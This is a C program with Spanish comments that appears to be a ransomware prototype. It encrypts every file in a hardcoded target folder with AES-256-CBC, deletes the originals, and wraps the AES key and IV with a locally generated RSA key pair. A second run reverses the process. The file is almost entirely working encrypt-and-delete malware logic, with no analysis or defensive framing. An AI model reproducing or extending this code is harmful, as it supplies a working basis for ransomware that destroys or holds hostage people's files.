#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

void generateRSAKeyPair(const char *privateKeyFileName, const char *publicKeyFileName) {
    RSA *rsa = RSA_new();
    BIGNUM *e = BN_new();

    if (rsa && e) {
        if (BN_set_word(e, RSA_F4) && RSA_generate_key_ex(rsa, 2048, e, NULL)) {
            FILE *privateKeyFile = fopen(privateKeyFileName, "wb");
            FILE *publicKeyFile = fopen(publicKeyFileName, "wb");
            if (privateKeyFile) {
                PEM_write_RSAPrivateKey(privateKeyFile, rsa, NULL, NULL, 0, NULL, NULL);
                PEM_write_RSAPublicKey(publicKeyFile, rsa);
                fclose(publicKeyFile);
                fclose(privateKeyFile);
            }
        }

        BN_free(e);
        RSA_free(rsa);
    }
}

void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
    // Abre el archivo de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(publicKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos del archivo de entrada y los encripta con la clave pública
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int encryptedSize = RSA_public_encrypt(bytesRead, inputBuffer, outputBuffer, publicKey, RSA_PKCS1_PADDING);
            if (encryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, encryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void decryptWithPrivateKey(const char* inputFileName, const char* outputFileName, RSA* privateKey) {
    // Abre el archivo cifrado de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(privateKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos cifrados del archivo de entrada y los descifra con la clave privada
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int decryptedSize = RSA_private_decrypt(bytesRead, inputBuffer, outputBuffer, privateKey, RSA_PKCS1_PADDING);
            if (decryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, decryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void generateRandomKey(unsigned char *key, int keyLength) {
    RAND_bytes(key, keyLength);
}

void generateRandomIV(unsigned char *iv, int ivLength) {
    RAND_bytes(iv, ivLength);
}

void saveKeyToFile(const char *keyFileName, const unsigned char *key, int keyLength) {
    FILE *keyFile = fopen(keyFileName, "wb");
    if (keyFile) {
        fwrite(key, 1, keyLength, keyFile);
        fclose(keyFile);
    }
}

void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength) {
    FILE *ivFile = fopen(ivFileName, "wb");
    if (ivFile) {
        fwrite(iv, 1, ivLength, ivFile);
        fclose(ivFile);
    }
}

void encryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
    FILE *input = fopen(inputFile, "rb");
    FILE *output = fopen(outputFile, "wb");

    if (input && output) {
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

        unsigned char buffer[1024];
        int bytesRead, encryptedLength;

        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input)) > 0) {
            EVP_EncryptUpdate(ctx, buffer, &encryptedLength, buffer, bytesRead);
            fwrite(buffer, 1, encryptedLength, output);
        }

        EVP_EncryptFinal_ex(ctx, buffer, &encryptedLength);
        fwrite(buffer, 1, encryptedLength, output);

        EVP_CIPHER_CTX_free(ctx);

        fclose(input);
        fclose(output);

        printf("Encriptación exitosa. Se han encriptado %d bytes.\n", encryptedLength);
    } else {
        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
    }
}

void decryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
    FILE *input = fopen(inputFile, "rb");
    FILE *output = fopen(outputFile, "wb");

    if (input && output) {
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

        unsigned char inBuffer[1024];
        unsigned char outBuffer[1024];
        int bytesRead, decryptedLength = 1;

        while ((bytesRead = fread(inBuffer, 1, sizeof(inBuffer), input)) > 0) {
            EVP_DecryptUpdate(ctx, outBuffer, &decryptedLength, inBuffer, bytesRead);
            fwrite(outBuffer, 1, decryptedLength, output);
        }

        EVP_DecryptFinal_ex(ctx, outBuffer, &decryptedLength);
        fwrite(outBuffer, 1, decryptedLength, output);

        EVP_CIPHER_CTX_free(ctx);

        fclose(input);
        fclose(output);

        printf("Desencriptación exitosa. Se han desencriptado %d bytes.\n", decryptedLength);
    } else {
        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
    }
}

int main() {
    // Inicializar OpenSSL
    OpenSSL_add_all_algorithms();

    // Definir la ruta completa de la carpeta a encriptar
    const char *LeerRegular = "C:\\Users\\usuario\\Desktop\\Objetivo\\*.*"; // Ruta a la carpeta donde se leeran archivos a encritar

    // Definir la ruta completa de la carpeta de salida para archivos encriptados
    const char *LeerEncriptados = "C:\\Users\\usuario\\Desktop\\Encriptados\\*.*"; // Ruta a la carpeta donde se leeran archivos encriptaos

    const char *CarpetaRegular = "C:\\Users\\usuario\\Desktop\\Objetivo\\";

    const char *CarpetaEncriptado = "C:\\Users\\usuario\\Desktop\\Encriptados\\";

    // Definir la ruta completa al archivo de clave
    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt";

    // Definir la ruta completa al archivo del IV
    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt";

    const char *privateKeyFileName = "C:\\Users\\usuario\\Desktop\\privado.pem"; 
    const char *publicKeyFileName = "C:\\Users\\usuario\\Desktop\\publico.pem";
    const char *clavecifrada = "C:\\Users\\usuario\\Desktop\\AEScifrado.txt";
    const char *ivAEScifrada = "C:\\Users\\usuario\\Desktop\\IVcifrado.txt";

    // Definir la clave y el vector de inicialización (IV)
    unsigned char key[32];
    unsigned char iv[16];

    // Verificar si el archivo de clave existe
    FILE *cifrado = fopen(clavecifrada, "rb");
    if (cifrado) {
        fclose(cifrado);
        FILE *privateKeyFile = fopen(privateKeyFileName, "rb");
        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFile, NULL, NULL, NULL);
        fclose(privateKeyFile);

        decryptWithPrivateKey(clavecifrada, keyFileName, clavePrivada);
        decryptWithPrivateKey(ivAEScifrada, ivFileName, clavePrivada);

        RSA_free(clavePrivada);

        FILE *keyFile = fopen(keyFileName, "rb");
        fread(key, 1, sizeof(key), keyFile);
        fclose(keyFile);
        
        // Leer el IV desde el archivo
        FILE *ivFile = fopen(ivFileName, "rb");
        if (ivFile) {
            fread(iv, 1, sizeof(iv), ivFile);
            fclose(ivFile);
        } else {
            printf("Error: no se encontró el archivo IV.\n");
            return 1;
        }

        // Realizar operaciones de descifrado sobre los archivos de la carpeta "encriptado"
        WIN32_FIND_DATA findFileData;
     
        HANDLE hFind = FindFirstFile((LeerEncriptados), &findFileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char inputFile[MAX_PATH];
                    char outputFile[MAX_PATH];

                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);

                    if (_taccess(outputFile, 0) != 0) {
                        // El archivo de salida no existe, así que lo creamos
                        FILE *newFile = _tfopen(outputFile, _T("wb"));
                        if (!newFile) {
                            printf("Error al crear el archivo de salida: %s\n", outputFile);
                        }

                        fclose(newFile);
                    }
                    decryptFile(inputFile, outputFile, key, iv);
                    remove(inputFile);
                }
            } while (FindNextFile(hFind, &findFileData) != 0);

            remove(keyFileName);
            remove(ivFileName);
            remove(privateKeyFileName);
            FindClose(hFind);
            printf("Archivos desencriptados con éxito.\n");
        } else {
            printf("Error al abrir la carpeta de archivos encriptados.\n");
        }
    } else {
        // Si el archivo de clave no existe, generamos una nueva clave y la guardamos
        generateRandomKey(key, sizeof(key));
        saveKeyToFile(keyFileName, key, sizeof(key));

        // Generar un IV aleatorio
        generateRandomIV(iv, sizeof(iv));
        saveIVToFile(ivFileName, iv, sizeof(iv));

        generateRSAKeyPair(privateKeyFileName, publicKeyFileName);

        FILE* publicKeyFile = fopen(publicKeyFileName, "rb");
        RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
        fclose(publicKeyFile);

        encryptWithPublicKey(keyFileName, clavecifrada, clavePublica);
        encryptWithPublicKey(ivFileName, ivAEScifrada, clavePublica);

        RSA_free(clavePublica);

        // Realizar operaciones de cifrado sobre los archivos de la carpeta "patata"
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile((LeerRegular), &findFileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char inputFile[MAX_PATH];
                    char outputFile[MAX_PATH];

                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);

                    if (_taccess(outputFile, 0) != 0) {
                        // El archivo de salida no existe, así que lo creamos
                        FILE *newFile = _tfopen(outputFile, _T("wb"));
                        if (!newFile) {
                            printf("Error al crear el archivo de salida: %s\n", outputFile);
                        }
                        fclose(newFile);
                    }
                    encryptFile(inputFile, outputFile, key, iv);
                    remove(inputFile);
                }
            } while (FindNextFile(hFind, &findFileData) != 0);

            FindClose(hFind);
            printf("Archivos encriptados con éxito y la clave se ha guardado en '%s'.\n", keyFileName);
            remove(publicKeyFileName);
        } else {
            printf("Error al abrir la carpeta de archivos a encriptar.\n");
        }
    }

    return 0;
}